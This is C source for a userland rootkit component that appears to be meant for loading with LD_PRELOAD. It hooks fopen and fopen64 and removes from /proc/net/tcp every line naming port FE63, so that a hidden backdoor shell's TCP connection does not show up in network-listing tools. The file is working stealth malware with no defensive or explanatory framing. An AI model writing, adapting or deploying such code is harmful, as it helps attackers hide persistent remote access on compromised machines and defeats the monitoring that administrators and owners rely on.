#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <sys/stat.h>

#define SHELL_PORT "FE63"

FILE *fopen64(const char *pathname, const char *mode) {
    // Obtain and store the address of the original fopen64
    FILE *(*fopen64_old)(const char *pathname, const char *mode);
    fopen64_old = dlsym(RTLD_NEXT, "fopen64");

    // Check if we open the file containing our open TCP socket
    if (strstr(pathname, "/proc/net/tcp") != NULL) {
        // Create file to store the edited output
        FILE *result = tmpfile64();
        // Open the original file
        FILE *content = fopen64_old(pathname, mode);

        char line[256];
        // Iterate over the lines of the original file
        while (fgets(line, sizeof(line), content) != NULL) {
            // Only add the line to the result if it does not contain our port
            if (strstr(line, SHELL_PORT) == NULL) {
                fputs(line, result);
            }
        }

        // set the file position indicator to the beginning, otherwise programs can't read from it
        rewind(result);
        return result;
    } else {
        // Use the original fopen64 for any other file
        FILE *result = fopen64_old(pathname, mode);
        return result;
    }
}

FILE *fopen(const char *pathname, const char *mode) {
    // Obtain and store the address of the original fopen
    FILE *(*fopen_old)(const char *pathname, const char *mode);
    fopen_old = dlsym(RTLD_NEXT, "fopen");

    // Check if we open the file containing our open TCP socket
    if (strstr(pathname, "/proc/net/tcp") != NULL) {
        // Create file to store the edited output
        FILE *result = tmpfile();
        // Open the original file
        FILE *content = fopen_old(pathname, mode);

        char line[256];
        // Iterate over the lines of the original file
        while (fgets(line, sizeof(line), content) != NULL) {
            // Only add the line to the result if it does not contain our port
            if (strstr(line, SHELL_PORT) == NULL) {
                fputs(line, result);
            }
        }

        // set the file position indicator to the beginning, otherwise programs can't read from it
        rewind(result);
        return result;
    } else {
        // Use the original fopen for any other file
        FILE *result = fopen_old(pathname, mode);
        return result;
    }
}
